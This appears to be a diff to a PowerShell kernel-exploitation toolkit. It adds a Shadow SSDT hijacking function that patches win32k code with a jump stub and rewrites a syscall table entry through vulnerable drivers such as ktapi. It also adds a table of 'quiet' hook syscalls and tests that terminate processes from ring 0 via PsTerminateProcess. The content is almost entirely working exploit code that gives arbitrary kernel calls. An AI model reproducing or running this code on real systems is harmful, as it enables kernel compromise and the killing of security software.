@@ -66,7 +66,8 @@ using namespace System.Windows.Forms
             "ksapi", "ksapi64_dev", "PDFWKRNL", "TPwSav", "WDTKernel",
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
-            "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv"
+            "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
+            "signed", "WinNotify"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -176,7 +177,7 @@ tskill /a notepad
 # Ring 0 Kill
 Start-Sleep -Seconds 1
 
-Invoke-SsdtNtCallHijack -Function PsTerminateProcess -Values @($eProc)
+Invoke-SsdtNtCallHijack -Function PsTerminateProcess -Values @($eProc, 0L, 0L)
 Terminate-SystemProcess -ProcessID $PROCID -DriverName BdApiUtil
 Terminate-KernelProcess -ProcID $PROCID    -Driver d591004
 #>
@@ -230,34 +231,80 @@ Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel KUser
 <#
 Clear-Host
 Write-Host
+Write-Host "=== Kernel Hook Test Results ===" -ForegroundColor Cyan
+Write-Host "---------------------------------" -ForegroundColor Gray
 
+# 1. Virtual to Physical Resolution
 $KernelVA = Get-KernelBaseAddress
-"VA: 0x{0:X16}" -f [Int64]$KernelVA
+$Func     = "MmGetPhysicalAddress"
+$Values   = @($KernelVA, 0L, 0L)
 
-$PA = Convert-VirtualToPhysical `
-    -VirtualAddress $KernelVA
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
+# Format VA cleanly
+$FormattedVA = "0x{0:X}" -f [Int64]$KernelVA
+Write-Host "Target Kernel VA : $FormattedVA"
+
+try {
+  $PA_Direct   = Convert-VirtualToPhysical -VirtualAddress $KernelVA
+} catch {}
+
+try {
+  $Handle      = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$KernelVA), 0)
+  $PA_TABLE    = Resolve-DirectoryTable -VA $Handle -ProcessID 4
+} catch {}
+
+try {
+  $PA_NtCall   = Invoke-SsdtNtCallHijack $Func $Values
+} catch {}
+
+try {
+  $PA_Callback = Invoke-SsdtCallbackHijack $Func $Values
+} catch {}
+
+try {
+  $PA_Shaddow  = Invoke-SsdtShadowCallHijack $Func $Values
+} catch {}
+
+Write-Host ("PA (NtCall)      : 0x{0:X}" -f $PA_NtCall)
+Write-Host ("PA (Callback)    : 0x{0:X}" -f $PA_Callback)
+Write-Host ("PA (Shaddow)     : 0x{0:X}" -f $PA_Shaddow)
+Write-Host ("PA (cr3 Table)   : 0x{0:X}" -f $PA_TABLE)
+Write-Host ("PA (Direct)      : 0x{0:X}" -f $PA_Direct)
+Write-Host "---------------------------------" -ForegroundColor Gray
+
+# 2. Process Termination Tests
+
+# Helper function to turn 0 into a readable status string
+function Get-StatusString ($StatusCode) {
+    if ($StatusCode -eq 0) { return "SUCCESS (0x00000000)" }
+    else { return "FAILED (0x$("{0:X8}" -f $StatusCode))" }
 }
 
-$PA = Invoke-SsdtNtCallHijack `
-    -Function MmGetPhysicalAddress `
-    -Values @($KernelVA) `
-    -ReturnMode Int64
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
-}
+# Test 1: NT Call Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result1 = Invoke-SsdtNtCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color1  = if ($Result1 -eq 0) { "Green" } else { "Red" }
+Write-Host "NtCall Hijack     -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result1)" -ForegroundColor $Color1
 
-$Values = $KernelVA, 0L
-$PA = Invoke-SsdtCallbackHijack `
-    -Function MmGetPhysicalAddress `
-    -Values $Values
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
-}
+# Test 2: Shadow Call Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result2 = Invoke-SsdtShadowCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color2  = if ($Result2 -eq 0) { "Green" } else { "Red" }
+Write-Host "ShadowCall Hijack -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result2)" -ForegroundColor $Color2
 
-Write-Host
-return
+# Test 3: Callback Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result3 = Invoke-SsdtCallbackHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color3  = if ($Result3 -eq 0) { "Green" } else { "Red" }
+Write-Host "Callback Hijack   -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result3)" -ForegroundColor $Color3
+
+Write-Host "---------------------------------" -ForegroundColor Gray
+Write-Host "[+] All execution routines finished." -ForegroundColor Green
 #>
 
 # Hardware-vs-Software-MemoryBridge
@@ -6585,6 +6632,7 @@ Function Set-RecoveryState {
         $null = New-ItemProperty -Path $RegPath -Name $ValueName -Value $Value -PropertyType String -Force
     }
 }
+# Win32 Driver Hijack // W10 only
 function Find-RipRelativeAddress {
     param (
         [Parameter(Mandatory=$true)]
@@ -6632,10 +6680,27 @@ Function Invoke-SsdtCallbackHijack {
         [string]$ReturnMode = "Int64",
 
         [string]$Driver     = 'win32k.sys',
-        [string]$Target     = 'NtUserSetSystemCursor',
+        [string]$Target     = 'NtUserBuildHwndList',
         [Byte[]]$MovPattern = @(72, 139, 5),
         [Int32]$MovSize     = 7
     )
+
+    $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
+    switch ($ParamCount) {
+        0 { $Target = "NtUserGetForegroundWindow" }      # 0 args: Zero background noise, flawless fallback.
+        1 { $Target = "NtUserGetThreadState" }           # 1 arg:  Basic index lookup, no handle validation.
+        2 { $Target = "NtUserIsTopLevelWindow" }         # 2 args: Checks (HWND, HWND). If passing dummy pointers, just returns FALSE cleanly.
+        3 { $Target = "NtUserGetControlBrush" }          # 3 args: Safe internal GDI engine callback. Only fires if you query it.
+        4 { $Target = "NtUserWaitAvailableMessageLoop" } # 4 args: Thread messaging utility. Ignores bad arguments gracefully.
+        5 { $Target = "NtUserUpdateLayeredWindow" }      # 5 args: Bails out silently if structures are null/0 instead of throwing NTSTATUS errors.
+        6 { $Target = "NtUserTrackPopupMenuEx" }         # 6 args: Safe context menu handler. Returns 0 cleanly on bad inputs.
+        7 { $Target = "NtUserSetWindowPos" }             # 7 args: 4 are raw coordinate integers, exceptionally stable.
+        8 { $Target = "NtUserScrollWindowEx" }           # 8 args: UI scrolling framework. Remains dead quiet until triggered.
+        9 { $Target = "NtUserDrawCaptionTemp" }          # 9 args: Title rendering routine. Low priority validation.
+        default {
+            Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
+        }
+    }
 
     $osBuild = [Marshal]::ReadInt32(0x7FFE0000, 0x260)
     $osBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
@@ -6714,6 +6779,141 @@ Function Invoke-SsdtCallbackHijack {
         Write-VirtualAddress -VA $LiveVariableVA -Long $CallbackVA | Out-Null
     }
 }
+# NTOSKRNL Hijack [Shaddow table]
+# // W10 only
+Function Invoke-SsdtShadowCallHijack {
+    param (
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Function,
+        [object[]]$Values = $null,
+        [ValidateSet("Int8", "Int32", "Int64")]
+        [string]$ReturnMode = "Int64",
+        [string]$Hook = "NtUserBuildHwndList"
+    )
+
+    $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
+    switch ($ParamCount) {
+        0 { $Hook = "NtUserGetForegroundWindow" }    # 0 args: Zero background noise, flawless fallback.
+        1 { $Hook = "NtUserGetThreadState" }         # 1 arg:  Basic index lookup, no handle validation.
+        2 { $Hook = "NtUserIsTopLevelWindow" }       # 2 args: Checks (HWND, HWND). If passing dummy pointers, just returns FALSE cleanly.
+        3 { $Hook = "NtUserGetControlBrush" }        # 3 args: Safe internal GDI engine callback. Only fires if you query it.
+        4 { $Hook = "NtUserWaitAvailableMessageLoop" }# 4 args: Thread messaging utility. Ignores bad arguments gracefully.
+        5 { $Hook = "NtUserUpdateLayeredWindow" }    # 5 args: Bails out silently if structures are null/0 instead of throwing NTSTATUS errors.
+        6 { $Hook = "NtUserTrackPopupMenuEx" }       # 6 args: Safe context menu handler. Returns 0 cleanly on bad inputs.
+        7 { $Hook = "NtUserSetWindowPos" }           # 7 args: 4 are raw coordinate integers, exceptionally stable.
+        8 { $Hook = "NtUserScrollWindowEx" }         # 8 args: UI scrolling framework. Remains dead quiet until triggered.
+        9 { $Hook = "NtUserDrawCaptionTemp" }        # 9 args: Title rendering routine. Low priority validation.
+        default {
+            Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
+        }
+    }
+
+    # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write – Exploit Pack
+    # https://www.exploitpack.com/blogs/news/shadow-ssdt-hijacking-to-achieve-kernel-code-execution-via-rw-primitives
+
+    $osBuild = [Marshal]::ReadInt32(0x7FFE0000, 0x260)
+    $osBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
+    if ($osBuild -ge 22000) {
+        Write-Warning "Not Supported in new Windows 11 Build's"
+        return
+    }
+
+    $Data    = Resolve-SymbolFromFile -DllName win32u.dll -FunctionName $Hook | select -ExpandProperty Bytes
+    $SysCall = [System.BitConverter]::ToInt32($Data,4)
+
+    $KerBase = Get-KernelBaseAddress
+    $RVA     = Resolve-SymbolFromPdb -FunctionName KeServiceDescriptorTableShadow
+    $TableAddress = [IntPtr]::Add($KerBase, $RVA)
+
+    # Extract the Index and the Selector
+    $Selector  = ($SysCall -shr 12) -band 0xF # The '1' in 0x1021
+    $Index     = $SysCall -band 0xFFF         # The '0x21' in 0x1021
+
+    # Descriptor 0 = System Service Table (ntoskrnl)
+    # Descriptor 1 = Shadow Table (win32k)
+    # Each descriptor is 0x20 bytes (0n32 decimal)
+    $DescriptorBase = $TableAddress.ToInt64() + ($Selector * 0x20)
+
+    # Extract the Rest .. 
+    $ShadowTableBase = Read-VirtualAddress -VA $DescriptorBase -AsLong
+    $EntryAddress = $ShadowTableBase + ($Index * 4)
+    $EncodedEntry = Read-VirtualAddress -VA $EntryAddress -AsInt
+
+    $RVA   = Resolve-SymbolFromFile -DllName win32k.sys -FunctionName __win32kstub_NtUserGetClipCursor | select -ExpandProperty RVA
+    $Win32 = Resolve-DriverAddress -DriverName win32k.sys 
+    $Clip  = [IntPtr]::Add($Win32, $RVA)
+
+    $TotalParams     = if ($null -ne $Values) { $Values.Count } else { 0 }
+    $StackParams     = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
+    $NewEncodedEntry = [int32]((($Clip - $ShadowTableBase) -shl 4) -bor $StackParams)
+
+    $RVA = Resolve-SymbolFromPdb -FunctionName $Function
+    $TargetAddress = [IntPtr]::Add($KerBase, $RVA)
+    $AddressBytes = [System.BitConverter]::GetBytes([Int64]$TargetAddress)
+    $InstructionPrefix = [Byte[]] @(0x48, 0xB8)
+    $InstructionEnd    = [Byte[]] @(0xFF, 0xE0)
+    $FinalInstruction  = $InstructionPrefix + $AddressBytes + $InstructionEnd
+
+    $backupArray = New-Object byte[] 16
+    $AddressBytes = [System.BitConverter]::GetBytes([int64]$Clip)
+    $UnsignedAddress = [System.BitConverter]::ToUInt64($AddressBytes, 0)
+    $ProcID = (Get-Process -Name explorer).Id
+
+    $ClipPa = Resolve-DirectoryTable -VA $UnsignedAddress -ProcessID $ProcID
+    if ($ClipPa -eq $null -or $ClipPa -eq 0) {
+        throw "Fail to Get PA Address"
+    }
+
+    $va = Map-VirtualAddress -PA $ClipPa -BlockSize 16 -DriverName ktapi
+    if ($null -ne $va -and $va -ne 0L) {
+        $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
+        [Marshal]::Copy($Address, $BackupArray, 0, $BackupArray.Length)
+
+        # This part, fail on windows 11, so, keep it first
+        # If it fail, no harmfull change will happen to kernel.
+        [marshal]::Copy($FinalInstruction, 0, $Address, $FinalInstruction.Length)
+
+        Unmap-VirtualAddress -MappedAddress $va -DriverName ktapi | Out-Null
+    } else {
+        $backupArray = $null
+    }
+
+    $MapObj = Map-KernelMemory -VA $EntryAddress -Size 4 -Mode gibepext -CacheType MmCached
+    if ($MapObj.MappedAddress -ne 0) {
+        Write-VirtualAddress -VA $MapObj.MappedAddress -Int $NewEncodedEntry | Out-Null
+        Free-IntPtr -handle $MapObj.Device -Method NtHandle
+    }
+
+    try {
+        if ($ReturnMode -eq "Int64") {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Values $values -Return int64
+        } elseif ($ReturnMode -eq "Int32") {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Values $values -Return int32
+        } else {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Values $values -Return byte
+        }
+        return $Res
+    }
+    finally {
+        $MapObj = Map-KernelMemory -VA $EntryAddress -Size 4 -Mode gibepext -CacheType MmCached
+        if ($MapObj.MappedAddress -ne 0) {
+            Write-VirtualAddress -VA $MapObj.MappedAddress -Int $EncodedEntry | Out-Null
+            Free-IntPtr -handle $MapObj.Device -Method NtHandle
+        }
+
+        if ($backupArray) {
+            $va = Map-VirtualAddress -PA $ClipPa -BlockSize 16 -DriverName ktapi
+            if ($null -ne $va -and $va -ne 0L) {
+                $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
+                [marshal]::Copy($backupArray, 0, $Address, $backupArray.Length)
+                Unmap-VirtualAddress -MappedAddress $va -DriverName ktapi | Out-Null
+            }
+        }
+    }
+}
+# NTOSKRNL Hijack [Main table]
+# // W10 -> W11 -> Both
 Function Invoke-SsdtNtCallHijack {
     param (
         [Parameter(Mandatory = $true)]
